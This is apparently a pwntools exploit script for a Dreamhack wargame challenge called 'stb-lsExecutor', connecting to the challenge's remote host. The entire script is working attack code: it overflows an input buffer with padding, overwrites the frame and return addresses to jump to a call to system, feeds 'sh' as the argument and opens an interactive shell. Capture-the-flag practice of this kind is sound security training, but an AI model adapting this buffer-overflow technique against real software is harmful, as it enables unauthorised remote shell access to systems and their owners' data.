#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./stb-lsExecutor',checksec=False)
#p = process()
p = remote(b'host3.dreamhack.games', 16099)
#gdb.attach(p,gdbscript = '''
#           b*0x4012f8
#           ''')
payload = b'A' * 48 + p64(0x00000000004040e9) #sel + 0x70
payload += p64(0x00000000004013cb) #call system
#input()
p.sendafter(b"option : ", b'A' * 60)
p.sendafter(b"path : ", payload)
p.sendafter(b"y/n", b'sh')

p.interactive()
